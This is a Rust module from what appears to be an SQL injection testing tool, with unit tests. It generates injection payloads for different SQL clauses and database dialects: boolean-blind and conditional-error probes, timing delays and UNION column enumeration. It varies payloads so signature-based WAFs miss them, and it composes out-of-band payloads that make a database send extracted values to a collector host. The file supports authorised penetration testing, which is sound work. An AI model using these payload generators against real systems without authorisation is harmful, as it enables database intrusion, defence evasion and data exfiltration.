//! Context-aware payload composition engine (P0 brief §10, §17, §35).
//!
//! Composes candidates from independent concerns — technique, clause
//! strategy, dialect, boundary, representation, mutation — rather than
//! storing literal strings. Nothing here is `<basic payload>`; a candidate
//! is generated because the evidence justifies it.

use crate::detection::DbmsFamily;
use crate::payload::boundary::{Boundary, QuoteMode};
use crate::payload::generate::{render_sql, LogicalTest};
use crate::payload::transform::{
    variants_for, RepresentationContext, TransformKind, TransformationTrace,
};
use crate::types::ProbeType;
use serde::{Deserialize, Serialize};

/// A clause-specific rendering strategy. The same logical test is expressed
/// differently depending on where the input lands in the statement.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ClauseStrategy {
    Where,
    Having,
    OrderBy,
    GroupBy,
    Join,
    Like,
    LimitOffset,
    InsertValues,
    UpdateSet,
    DeleteWhere,
    SelectExpression,
    FunctionArgument,
    /// Unknown position: use the most portable WHERE-style expression.
    Generic,
}

impl ClauseStrategy {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Where => "WHERE",
            Self::Having => "HAVING",
            Self::OrderBy => "ORDER BY",
            Self::GroupBy => "GROUP BY",
            Self::Join => "JOIN",
            Self::Like => "LIKE",
            Self::LimitOffset => "LIMIT/OFFSET",
            Self::InsertValues => "INSERT VALUES",
            Self::UpdateSet => "UPDATE SET",
            Self::DeleteWhere => "DELETE WHERE",
            Self::SelectExpression => "SELECT expression",
            Self::FunctionArgument => "function argument",
            Self::Generic => "unknown",
        }
    }

    /// Render a boolean/binary logical test for this clause.
    ///
    /// ORDER BY and LIMIT/OFFSET cannot take a boolean predicate, so the
    /// engine uses different constructs there — this is the point of
    /// clause-awareness. Equality arms use randomized operands
    /// ([`evasive_equality`]) rather than the trivial `1=1`/`1=2`.
    pub fn render_conditional(&self, truth: bool) -> String {
        let eq = crate::payload::generate::evasive_equality(truth);
        match self {
            // Boolean-expressible positions.
            Self::Where | Self::Having | Self::Join | Self::DeleteWhere | Self::Generic => {
                format!("AND {eq}")
            }
            // Pattern positions use a tautology through LIKE.
            Self::Like => format!("OR {eq}-- "),
            // ORDER BY takes an expression, not a predicate. Use a sort key.
            Self::OrderBy => {
                if truth { ",(SELECT 1)".into() } else { ",(SELECT 1/0)".into() }
            }
            Self::GroupBy => format!(" AND {eq} GROUP BY 1"),
            // LIMIT/OFFSET takes integers; a conditional subquery is the
            // only portable way to vary behaviour.
            Self::LimitOffset => {
                if truth {
                    format!(" AND {eq}")
                } else {
                    let n = crate::payload::generate::evasive_operand();
                    format!(" AND {n}=(SELECT {})", n.wrapping_add(1))
                }
            }
            Self::InsertValues | Self::UpdateSet | Self::SelectExpression | Self::FunctionArgument => {
                format!(" AND {eq}")
            }
        }
    }

    /// Render a CASE/WHEN conditional-error differential for this clause.
    ///
    /// The TRUE arm evaluates cleanly; the FALSE arm forces a benign,
    /// non-destructive runtime error (division by zero, or — on MySQL, where
    /// `1/0` yields NULL rather than erroring — a scalar-subquery cardinality
    /// violation). The observable differential is "error vs no error", which
    /// survives contexts where boolean-blind response bodies are identical.
    pub fn render_conditional_error(&self, truth: bool, dbms: Option<DbmsFamily>) -> String {
        let n = crate::payload::generate::evasive_operand();
        let cond = if truth {
            format!("{n}={n}")
        } else {
            format!("{n}={}", n.wrapping_add(1))
        };
        let err = conditional_error_expr(dbms);
        let case = format!("(SELECT CASE WHEN ({cond}) THEN 1 ELSE {err} END)");
        match self {
            Self::OrderBy => format!(",{case}"),
            Self::Like => format!("OR {case} IS NOT NULL-- "),
            _ => format!("AND {case} IS NOT NULL"),
        }
    }

    /// Whether a STACKED statement is even conceptually meaningful here.
    /// It is not inside an expression position (SELECT/WHERE operand).
    pub fn supports_stacked(&self) -> bool {
        matches!(self, Self::Generic)
    }
}

/// How a boolean differential's operands are expressed.
///
/// Both styles keep the TRUE/FALSE arms logically matched; they differ only
/// in the *observable* they produce.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PredicateStyle {
    /// `AND N=N` / `AND N=M` — a body/status differential.
    Arithmetic,
    /// `AND (SELECT CASE WHEN (N=N) THEN 1 ELSE 1/0 END) IS NOT NULL` — an
    /// error-vs-no-error differential that survives identical bodies.
    ConditionalError,
}

/// The non-destructive error expression to place in a conditional-error
/// FALSE arm, per DBMS.
fn conditional_error_expr(dbms: Option<DbmsFamily>) -> &'static str {
    match dbms {
        // On MySQL/MariaDB `1/0` returns NULL rather than raising, so force a
        // scalar-subquery cardinality violation instead.
        Some(DbmsFamily::MySQL) | Some(DbmsFamily::MariaDB) => "(SELECT 1 UNION SELECT 2)",
        _ => "1/0",
    }
}

/// Evidence gathered so far, which drives escalation.
#[derive(Debug, Clone, Default)]
pub struct EvidenceSummary {
    /// The error technique produced a DBMS signature.
    pub error_signal: bool,
    /// The boolean pair produced a repeatable divergence.
    pub boolean_signal: bool,
    /// Timing showed a statistically separated distribution.
    pub timing_signal: bool,
    /// A DBMS was fingerprinted.
    pub dbms_known: bool,
    /// The edge layer blocked at least one probe.
    pub waf_interference: bool,
    /// Number of candidates already executed against this parameter.
    pub attempts_so_far: u32,
}

/// How aggressive the generator may be, derived from evidence.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EscalationTier {
    /// No signal yet: cheapest discriminating tests only.
    Recon,
    /// A signal appeared: confirm it independently.
    Confirm,
    /// Confirmed: explore context, dialect and representation breadth.
    Explore,
}

impl EscalationTier {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Recon => "recon",
            Self::Confirm => "confirm",
            Self::Explore => "explore",
        }
    }
}

/// Decide the escalation tier from accumulated evidence.
///
/// This is the rule that prevents the engine blasting every technique at
/// every parameter: with no signal it stays cheap; only corroborated
/// signals unlock the expensive breadth.
pub fn decide_tier(evidence: &EvidenceSummary) -> EscalationTier {
    let strong_signals = [
        evidence.error_signal,
        evidence.boolean_signal,
        evidence.timing_signal,
    ]
    .iter()
    .filter(|s| **s)
    .count();

    if strong_signals >= 2 {
        EscalationTier::Explore
    } else if strong_signals == 1 {
        EscalationTier::Confirm
    } else {
        EscalationTier::Recon
    }
}

/// Techniques to attempt at a tier, in order.
pub fn techniques_for(tier: EscalationTier, has_delay_capability: bool) -> Vec<ProbeType> {
    match tier {
        EscalationTier::Recon => {
            // Cheapest, highest-information tests first.
            vec![ProbeType::ErrorInjection, ProbeType::BooleanBlind]
        }
        EscalationTier::Confirm => {
            let mut v = vec![ProbeType::BooleanBlind, ProbeType::ErrorInjection];
            if has_delay_capability {
                v.push(ProbeType::TimingProbe);
            }
            v
        }
        EscalationTier::Explore => {
            let mut v = vec![
                ProbeType::BooleanBlind,
                ProbeType::ErrorInjection,
                ProbeType::UnionBased,
                ProbeType::ClauseVariant,
            ];
            if has_delay_capability {
                v.push(ProbeType::TimingProbe);
            }
            v
        }
    }
}

/// A fully composed, executable candidate with its complete provenance.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComposedCandidate {
    pub id: uuid::Uuid,
    pub technique: ProbeType,
    pub clause: ClauseStrategy,
    pub logical_test: String,
    /// The SQL after dialect rendering, before boundary wrapping.
    pub sql: String,
    /// The final string to place at the injection point.
    pub rendered: String,
    pub boundary: Boundary,
    pub trace: TransformationTrace,
    pub dialect: Option<String>,
    pub expected_dbms: Option<DbmsFamily>,
    /// The tier that produced this candidate.
    pub tier: EscalationTier,
    /// Why this candidate exists — shown in the UI so a test is never opaque.
    pub rationale: String,
}

/// Inputs to composition.
#[derive(Debug, Clone)]
pub struct ComposeContext {
    pub clause: ClauseStrategy,
    pub quote_mode: QuoteMode,
    pub dbms: Option<DbmsFamily>,
    pub representation: RepresentationContext,
    pub original_value: String,
    /// Whether the WAF blocked earlier probes (adds representation breadth).
    pub waf_interference: bool,
}

/// The column-count sweep width for UNION enumeration. sqlmap fuzzes up to
/// `FUZZ_UNION_MAX_COLUMNS = 10` by default; we mirror that bound. The sweep is
/// emitted in full but the adaptive loop's `max_experiments` budget and the
/// `TestLedger` dedup cap how many probes actually fire.
const UNION_ENUM_COLUMNS: usize = 10;

/// Compose the full candidate set for one technique at one tier.
pub fn compose_for(
    technique: ProbeType,
    ctx: &ComposeContext,
    tier: EscalationTier,
    seconds: u32,
) -> Vec<ComposedCandidate> {
    let mut out = Vec::new();

    // Representation variants: identity first, then (if the WAF interfered
    // or we are exploring) the decoder-differentiating variants.
    let mut rep_variants = variants_for(ctx.representation);
    if !(ctx.waf_interference || tier == EscalationTier::Explore) {
        rep_variants.truncate(1);
    }

    let boundaries = crate::payload::boundary::candidates_for(ctx.quote_mode);

    // The logical tests this technique needs, each with its predicate style.
    let mut tests: Vec<(LogicalTest, PredicateStyle, &str)> = match technique {
        ProbeType::BooleanBlind => vec![
            (LogicalTest::AlwaysTrue, PredicateStyle::Arithmetic, "true condition"),
            (LogicalTest::AlwaysFalse, PredicateStyle::Arithmetic, "false condition"),
        ],
        ProbeType::ErrorInjection => {
            vec![(LogicalTest::SyntaxBreak, PredicateStyle::Arithmetic, "elicit a parser error")]
        }
        ProbeType::TimingProbe => vec![(
            LogicalTest::TimeDelay { seconds },
            PredicateStyle::Arithmetic,
            "conditional delay",
        )],
        ProbeType::UnionBased => {
            // Column-count enumeration, sqlmap-style: the cheap `ORDER BY n`
            // oracle first (a high index errors where a low one does not — the
            // boundary between them is the column count), then NULL-padded
            // `UNION SELECT` probes confirm the width. Both sweep 1..=N; the
            // pipeline observes where behaviour changes.
            let mut v = Vec::with_capacity(UNION_ENUM_COLUMNS * 2);
            for c in 1..=UNION_ENUM_COLUMNS {
                v.push((
                    LogicalTest::ColumnCountProbe { columns: c },
                    PredicateStyle::Arithmetic,
                    "enumerate column count via ORDER BY",
                ));
            }
            for c in 1..=UNION_ENUM_COLUMNS {
                v.push((
                    LogicalTest::UnionProbe { columns: c },
                    PredicateStyle::Arithmetic,
                    "probe UNION column count",
                ));
            }
            v
        }
        ProbeType::ClauseVariant => vec![
            (LogicalTest::AlwaysTrue, PredicateStyle::Arithmetic, "clause-position probe"),
            (LogicalTest::StackedMarker, PredicateStyle::Arithmetic, "stacked-statement detection"),
        ],
        ProbeType::SyntaxFeature => {
            vec![(LogicalTest::SyntaxBreak, PredicateStyle::Arithmetic, "syntax feature probe")]
        }
        ProbeType::Baseline => Vec::new(),
    };

    // Under edge interference, or once exploring, add a conditional-error
    // boolean pair: a stronger differential (error vs no error) that survives
    // contexts where the boolean-blind body is identical.
    if technique == ProbeType::BooleanBlind
        && (ctx.waf_interference || tier == EscalationTier::Explore)
    {
        tests.push((
            LogicalTest::AlwaysTrue,
            PredicateStyle::ConditionalError,
            "true condition (conditional error)",
        ));
        tests.push((
            LogicalTest::AlwaysFalse,
            PredicateStyle::ConditionalError,
            "false condition (conditional error)",
        ));
    }

    // Boundaries form the outer loop so a matched true/false pair emits
    // adjacently on the same boundary. Under a tight experiment budget the
    // pipeline would otherwise spend every slot on AlwaysTrue arms (across all
    // boundaries) before reaching a single AlwaysFalse — starving the boolean
    // differential and the NOT_SQL_INTERPRETED verdict, which requires both
    // arms to have run. Pairing per boundary lets the differential complete
    // within two experiments.
    for boundary in &boundaries {
        for (test, style, test_label) in &tests {
            // A stacked marker only makes sense where a second statement could
            // exist; skip it for expression positions rather than emitting a
            // payload we know cannot work.
            if matches!(test, LogicalTest::StackedMarker) && !ctx.clause.supports_stacked() {
                continue;
            }

            // Clause-aware rendering: for boolean/conditional tests, the clause
            // strategy decides the actual expression; otherwise the general
            // dialect renderer applies.
            let base_sql = match (test, technique, style) {
                (LogicalTest::AlwaysTrue, t, PredicateStyle::Arithmetic)
                    if t != ProbeType::UnionBased =>
                {
                    ctx.clause.render_conditional(true)
                }
                (LogicalTest::AlwaysFalse, t, PredicateStyle::Arithmetic)
                    if t != ProbeType::UnionBased =>
                {
                    ctx.clause.render_conditional(false)
                }
                (LogicalTest::AlwaysTrue, _, PredicateStyle::ConditionalError) => {
                    ctx.clause.render_conditional_error(true, ctx.dbms)
                }
                (LogicalTest::AlwaysFalse, _, PredicateStyle::ConditionalError) => {
                    ctx.clause.render_conditional_error(false, ctx.dbms)
                }
                _ => render_sql(test, ctx.dbms),
            };

            // The conditional-error style is tagged in the logical_test so it
            // deduplicates and reports distinctly, while keeping the
            // "AlwaysTrue"/"AlwaysFalse" substring the pipeline keys on.
            let logical_test = match style {
                PredicateStyle::ConditionalError => format!("{test:?}+CaseError"),
                PredicateStyle::Arithmetic => format!("{test:?}"),
            };

            let wrapped = boundary.render(&base_sql);
            for variant in &rep_variants {
                let mut trace = TransformationTrace::new(&wrapped);
                for step in variant {
                    trace = trace.apply(*step);
                }

                let rationale = build_rationale(
                    technique, test_label, ctx, tier, boundary, variant, seconds,
                );

                out.push(ComposedCandidate {
                    id: uuid::Uuid::new_v4(),
                    technique,
                    clause: ctx.clause,
                    logical_test: logical_test.clone(),
                    sql: base_sql.clone(),
                    rendered: trace.final_representation.clone(),
                    boundary: boundary.clone(),
                    trace,
                    dialect: ctx.dbms.map(|d| format!("{d:?}")),
                    expected_dbms: ctx.dbms,
                    tier,
                    rationale,
                });
            }
        }
    }

    // Engine-specific catalogue breadth, gated by the tier. This is the layer
    // that carries the per-engine primitives (see `payload::vectors`): it stays
    // silent during recon and opens up as evidence accumulates.
    out.extend(compose_catalogue(technique, ctx, tier, seconds));

    out
}

/// The maximum number of catalogue candidates one technique may add at one
/// tier. Breadth must never turn into an unbounded request storm.
const MAX_CATALOGUE_PER_TECHNIQUE: usize = 12;

/// Compose engine-specific catalogue candidates for one technique.
///
/// Where [`compose_for`] renders the portable forms from clause, boundary and
/// representation, this adds the engine's *own* primitives: MySQL's
/// `GTID_SUBSET`, Oracle's `CTXSYS.DRITHSX.SN`, SQLite's `RANDOMBLOB`, MSSQL's
/// `WAITFOR DELAY`. Nothing is emitted during `Recon`, because a
/// dialect-specific primitive is only worth a request once we know the dialect
/// and have a signal on the parameter.
pub fn compose_catalogue(
    technique: ProbeType,
    ctx: &ComposeContext,
    tier: EscalationTier,
    seconds: u32,
) -> Vec<ComposedCandidate> {
    use crate::payload::vectors::{self, EvidenceGate, VectorChannel, VectorContext};

    let Some(dbms) = ctx.dbms else {
        return Vec::new();
    };
    if tier == EscalationTier::Recon {
        return Vec::new();
    }
    let channel = match technique {
        ProbeType::ErrorInjection => VectorChannel::ErrorExtraction,
        ProbeType::TimingProbe => VectorChannel::Timing,
        ProbeType::BooleanBlind => VectorChannel::Boolean,
        ProbeType::UnionBased => VectorChannel::Union,
        ProbeType::ClauseVariant => VectorChannel::Stacked,
        ProbeType::SyntaxFeature => VectorChannel::Inline,
        ProbeType::Baseline => return Vec::new(),
    };

    let profile = crate::dialects::profile(dbms);
    let vctx = VectorContext {
        query: vectors::extraction_query(&profile),
        seconds,
        columns: 3,
        host: String::new(),
        truth: true,
    };
    let boundaries = crate::payload::boundary::candidates_for(ctx.quote_mode);
    let mut rep_variants = variants_for(ctx.representation);
    if !(ctx.waf_interference || tier == EscalationTier::Explore) {
        rep_variants.truncate(1);
    }

    let mut out = Vec::new();
    for vector in vectors::vectors_for(dbms, channel, &vctx) {
        // Gate enforcement. A collector-gated vector is never emitted by the
        // live loop: it needs an out-of-band endpoint the operator owns.
        let allowed = match vector.gate {
            EvidenceGate::Always => true,
            EvidenceGate::AfterSignal => true,
            EvidenceGate::AfterFingerprint => tier == EscalationTier::Explore,
            EvidenceGate::RequiresCollector => false,
        };
        if !allowed {
            continue;
        }
        for boundary in boundaries.iter().take(2) {
            if out.len() >= MAX_CATALOGUE_PER_TECHNIQUE {
                return out;
            }
            let wrapped = boundary.render(&vector.sql);
            let mut trace = TransformationTrace::new(&wrapped);
            if let Some(variant) = rep_variants.first() {
                for step in variant {
                    trace = trace.apply(*step);
                }
            }
            out.push(ComposedCandidate {
                id: uuid::Uuid::new_v4(),
                technique,
                clause: ctx.clause,
                logical_test: format!("Catalogue[{}]", vector.id),
                sql: vector.sql.clone(),
                rendered: trace.final_representation.clone(),
                boundary: boundary.clone(),
                trace,
                dialect: Some(format!("{dbms:?}")),
                expected_dbms: Some(dbms),
                tier,
                rationale: format!(
                    "{} (gate: {}; tier: {})",
                    vector.mechanism,
                    vector.gate.label(),
                    tier.label()
                ),
            });
        }
    }
    out
}
/// Compose the out-of-band exfiltration candidates for one target host.
///
/// This is the *sole* authorized emitter of collector-gated
/// ([`EvidenceGate::RequiresCollector`]) vectors. It is deliberately kept out
/// of [`compose_catalogue`]'s technique loop — no [`ProbeType`] maps to the
/// out-of-band channel, and these vectors must never fire on the normal live
/// loop, only when `run_adaptive` has an operator-configured collector.
///
/// `callback_host` is the fully-qualified name the DB should reach out to —
/// `OobToken::callback_host(domain)` — with the planted token as a label.
/// Each vector's `{HOST}` is substituted with it and `{Q}` with the engine's
/// extraction query, so a correlated interaction both proves the injection and
/// carries the leaked value in the observed subdomain.
///
/// Returns an empty vector unless the dbms is known and `callback_host` is
/// non-empty, so a missing collector can never produce an OOB payload.
pub fn compose_oob(ctx: &ComposeContext, callback_host: &str) -> Vec<ComposedCandidate> {
    use crate::payload::vectors::{self, EvidenceGate, VectorChannel, VectorContext};

    let Some(dbms) = ctx.dbms else {
        return Vec::new();
    };
    if callback_host.trim().is_empty() {
        return Vec::new();
    }

    let profile = crate::dialects::profile(dbms);
    let vctx = VectorContext {
        query: vectors::extraction_query(&profile),
        seconds: 0,
        columns: 3,
        host: callback_host.to_string(),
        truth: true,
    };
    let boundaries = crate::payload::boundary::candidates_for(ctx.quote_mode);

    let mut out = Vec::new();
    for vector in vectors::vectors_for(dbms, VectorChannel::OutOfBand, &vctx) {
        // Only collector-gated vectors belong here; anything else would be a
        // mis-tagged primitive and must not be emitted through the OOB path.
        if vector.gate != EvidenceGate::RequiresCollector {
            continue;
        }
        for boundary in boundaries.iter().take(2) {
            if out.len() >= MAX_CATALOGUE_PER_TECHNIQUE {
                return out;
            }
            let wrapped = boundary.render(&vector.sql);
            let trace = TransformationTrace::new(&wrapped);
            out.push(ComposedCandidate {
                id: uuid::Uuid::new_v4(),
                // No ProbeType models OOB; tag with the closest existing
                // technique. Stage 5b routes by the `OutOfBand[..]` marker and
                // the collector gate, not this tag.
                technique: ProbeType::SyntaxFeature,
                clause: ctx.clause,
                logical_test: format!("OutOfBand[{}]", vector.id),
                sql: vector.sql.clone(),
                rendered: trace.final_representation.clone(),
                boundary: boundary.clone(),
                trace,
                dialect: Some(format!("{dbms:?}")),
                expected_dbms: Some(dbms),
                tier: EscalationTier::Explore,
                rationale: format!(
                    "{} (out-of-band; gate: {}; makes the DB perform an outbound \
                     lookup to the operator-controlled collector)",
                    vector.mechanism,
                    vector.gate.label(),
                ),
            });
        }
    }
    out
}
fn build_rationale(
    technique: ProbeType,
    test_label: &str,
    ctx: &ComposeContext,
    tier: EscalationTier,
    boundary: &Boundary,
    variant: &[TransformKind],
    seconds: u32,
) -> String {
    let mut parts = vec![format!(
        "{test_label} via {:?} in a {} {} context",
        technique,
        ctx.clause.label(),
        match ctx.quote_mode {
            QuoteMode::None => "numeric",
            QuoteMode::Single => "single-quoted",
            QuoteMode::Double => "double-quoted",
            QuoteMode::Backtick => "backtick-quoted",
            QuoteMode::Bracket => "bracket-quoted",
        }
    )];
    if let Some(dbms) = ctx.dbms {
        parts.push(format!("rendered for {dbms:?}"));
    } else {
        parts.push("DBMS unknown — portable form".into());
    }
    if boundary.paren_depth > 0 {
        parts.push(format!("closes {} paren level(s)", boundary.paren_depth));
    }
    if !variant.is_empty() {
        parts.push(format!(
            "representation: {}",
            variant
                .iter()
                .map(|t| t.label())
                .collect::<Vec<_>>()
                .join("+")
        ));
    }
    if ctx.waf_interference {
        parts.push("representation breadth widened after edge interference".into());
    }
    parts.push(format!("tier: {}", tier.label()));
    if matches!(technique, ProbeType::TimingProbe) {
        parts.push(format!("{seconds}s delay, requires statistical separation"));
    }
    parts.join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx() -> ComposeContext {
        ComposeContext {
            clause: ClauseStrategy::Where,
            quote_mode: QuoteMode::Single,
            dbms: Some(DbmsFamily::PostgreSQL),
            representation: RepresentationContext::QueryValue,
            original_value: "1".into(),
            waf_interference: false,
        }
    }

    #[test]
    fn recon_tier_is_cheap() {
        let techniques = techniques_for(EscalationTier::Recon, true);
        assert!(techniques.len() <= 2, "recon must stay cheap");
        assert!(!techniques.contains(&ProbeType::UnionBased));
    }

    #[test]
    fn one_signal_confirms_two_signal_explores() {
        let mut e = EvidenceSummary::default();
        assert_eq!(decide_tier(&e), EscalationTier::Recon);
        e.error_signal = true;
        assert_eq!(decide_tier(&e), EscalationTier::Confirm);
        e.boolean_signal = true;
        assert_eq!(decide_tier(&e), EscalationTier::Explore);
    }

    #[test]
    fn explore_tier_adds_union_and_clause() {
        let techniques = techniques_for(EscalationTier::Explore, true);
        assert!(techniques.contains(&ProbeType::UnionBased));
        assert!(techniques.contains(&ProbeType::ClauseVariant));
    }

    #[test]
    fn no_delay_capability_drops_timing() {
        let techniques = techniques_for(EscalationTier::Explore, false);
        assert!(!techniques.contains(&ProbeType::TimingProbe));
    }

    #[test]
    fn clause_strategy_changes_the_expression() {
        // ORDER BY cannot take a boolean predicate.
        let order = ClauseStrategy::OrderBy.render_conditional(true);
        let where_ = ClauseStrategy::Where.render_conditional(true);
        assert_ne!(order, where_);
        assert!(order.contains("SELECT"));
    }

    #[test]
    fn order_by_does_not_use_boolean_predicate() {
        assert!(!ClauseStrategy::OrderBy.render_conditional(true).contains("1=1"));
    }

    #[test]
    fn stacked_skipped_for_expression_positions() {
        let mut c = ctx();
        c.clause = ClauseStrategy::SelectExpression;
        let candidates = compose_for(ProbeType::ClauseVariant, &c, EscalationTier::Explore, 5);
        assert!(
            !candidates.iter().any(|x| x.logical_test.contains("StackedMarker")),
            "stacked marker emitted for a SELECT expression position"
        );
    }

    #[test]
    fn recon_uses_only_identity_representation() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Recon, 5);
        assert!(candidates.iter().all(|c| c.trace.steps.is_empty()));
    }

    #[test]
    fn waf_interference_widens_representation() {
        let mut c = ctx();
        c.waf_interference = true;
        let candidates = compose_for(ProbeType::BooleanBlind, &c, EscalationTier::Recon, 5);
        assert!(
            candidates.iter().any(|c| !c.trace.steps.is_empty()),
            "WAF interference should widen representation choices"
        );
    }

    #[test]
    fn explore_tier_widens_representation() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Explore, 5);
        assert!(candidates.len() > 2);
        assert!(candidates.iter().any(|c| !c.trace.steps.is_empty()));
    }

    #[test]
    fn boolean_composes_a_true_false_pair() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Recon, 5);
        // Expert differentials only — no trivial single-digit `1=1`/`1=2`
        // tautology that a signature WAF matches on sight.
        assert!(
            candidates.iter().all(|c| !is_trivial_tautology(&c.sql)),
            "a trivial tautology leaked into a candidate: {:?}",
            candidates.iter().map(|c| c.sql.clone()).collect::<Vec<_>>()
        );
        // A matched pair: one equal-operand (true) and one unequal (false).
        assert!(
            candidates
                .iter()
                .any(|c| first_int_comparison(&c.sql).map(|(l, r)| l == r) == Some(true)),
            "no true (equal-operand) differential"
        );
        assert!(
            candidates
                .iter()
                .any(|c| first_int_comparison(&c.sql).map(|(l, r)| l != r) == Some(true)),
            "no false (unequal-operand) differential"
        );
    }

    #[test]
    fn explore_tier_adds_conditional_error_pair() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Explore, 5);
        assert!(
            candidates.iter().any(|c| c.logical_test.contains("CaseError")),
            "conditional-error style not emitted at Explore"
        );
        // The tag preserves the substring the pipeline keys on.
        assert!(candidates
            .iter()
            .any(|c| c.logical_test.contains("AlwaysTrue") && c.logical_test.contains("CaseError")));
        // The FALSE arm forces a non-destructive division-by-zero error.
        assert!(candidates
            .iter()
            .any(|c| c.logical_test.starts_with("AlwaysFalse+") && c.sql.contains("1/0")));
    }

    #[test]
    fn recon_tier_has_no_conditional_error_pair() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Recon, 5);
        assert!(candidates.iter().all(|c| !c.logical_test.contains("CaseError")));
    }

    /// The first `<digits>=<digits>` comparison in `sql`, as `(left, right)`.
    fn first_int_comparison(sql: &str) -> Option<(&str, &str)> {
        let bytes = sql.as_bytes();
        for (i, _) in sql.match_indices('=') {
            let mut ls = i;
            while ls > 0 && bytes[ls - 1].is_ascii_digit() {
                ls -= 1;
            }
            let mut re = i + 1;
            while re < bytes.len() && bytes[re].is_ascii_digit() {
                re += 1;
            }
            if ls < i && re > i + 1 {
                return Some((&sql[ls..i], &sql[i + 1..re]));
            }
        }
        None
    }

    /// Whether the comparison is the trivial single-digit `1=1`/`1=2` that a
    /// signature filter keys on (randomized 4-digit operands are not).
    fn is_trivial_tautology(sql: &str) -> bool {
        matches!(first_int_comparison(sql), Some(("1", "1")) | Some(("1", "2")))
    }

    #[test]
    fn every_candidate_has_rationale_and_dialect() {
        for technique in [
            ProbeType::BooleanBlind,
            ProbeType::ErrorInjection,
            ProbeType::UnionBased,
        ] {
            for c in compose_for(technique, &ctx(), EscalationTier::Explore, 5) {
                assert!(!c.rationale.is_empty());
                assert!(c.rationale.contains("tier:"));
                assert_eq!(c.dialect.as_deref(), Some("PostgreSQL"));
            }
        }
    }

    #[test]
    fn candidates_are_unique() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Explore, 5);
        let ids: std::collections::HashSet<_> = candidates.iter().map(|c| c.id).collect();
        assert_eq!(ids.len(), candidates.len());
    }

    #[test]
    fn transformed_candidate_differs_from_untransformed() {
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Explore, 5);
        let untransformed: Vec<&ComposedCandidate> =
            candidates.iter().filter(|c| c.trace.steps.is_empty()).collect();
        let transformed: Vec<&ComposedCandidate> =
            candidates.iter().filter(|c| !c.trace.steps.is_empty()).collect();
        assert!(!untransformed.is_empty() && !transformed.is_empty());
        assert_ne!(
            untransformed[0].rendered,
            transformed[0].rendered,
            "transformation produced no change"
        );
    }

    #[test]
    fn baseline_composes_nothing() {
        assert!(compose_for(ProbeType::Baseline, &ctx(), EscalationTier::Recon, 5).is_empty());
    }

    #[test]
    fn boolean_pair_interleaves_within_budget() {
        // Both arms must be reachable under a tight experiment budget. With the
        // boundary as the outer loop, a matched true/false pair emits adjacently
        // rather than every AlwaysTrue (across all boundaries) preceding the
        // first AlwaysFalse — which would starve the differential and the
        // NOT_SQL_INTERPRETED verdict that requires both arms to run.
        let candidates = compose_for(ProbeType::BooleanBlind, &ctx(), EscalationTier::Recon, 5);
        let first_true = candidates
            .iter()
            .position(|c| c.logical_test.contains("AlwaysTrue"))
            .expect("a true arm");
        let first_false = candidates
            .iter()
            .position(|c| c.logical_test.contains("AlwaysFalse"))
            .expect("a false arm");
        // The first false arm sits immediately after the first true arm, so a
        // two-experiment budget captures a complete pair.
        assert!(
            first_false <= first_true + 1,
            "false arm at {first_false} is not adjacent to true arm at {first_true}"
        );
    }

    #[test]
    fn union_probe_is_bounded_at_recon_explore() {
        let candidates = compose_for(ProbeType::UnionBased, &ctx(), EscalationTier::Explore, 5);
        assert!(!candidates.is_empty());
        // The portable probes enumerate column counts 1..=10 (sqlmap-style
        // ORDER BY oracle + NULL-padded UNION), and nothing beyond that — the
        // sweep is a bounded fuzz, never an open-ended storm.
        assert!(candidates
            .iter()
            .filter(|c| !c.logical_test.starts_with("Catalogue"))
            .all(|c| {
                (c.logical_test.starts_with("UnionProbe")
                    || c.logical_test.starts_with("ColumnCountProbe"))
                    && (1..=UNION_ENUM_COLUMNS)
                        .any(|n| c.logical_test.contains(&format!("columns: {n}")))
            }));
        // Both the ORDER BY oracle and the UNION confirmation are present.
        assert!(candidates
            .iter()
            .any(|c| c.logical_test.starts_with("ColumnCountProbe")));
        assert!(candidates
            .iter()
            .any(|c| c.logical_test.starts_with("UnionProbe")));
        // ... and the engine catalogue is bounded too, so breadth can never
        // turn into an unbounded request storm.
        assert!(
            candidates
                .iter()
                .filter(|c| c.logical_test.starts_with("Catalogue"))
                .count()
                <= 12
        );
    }
}
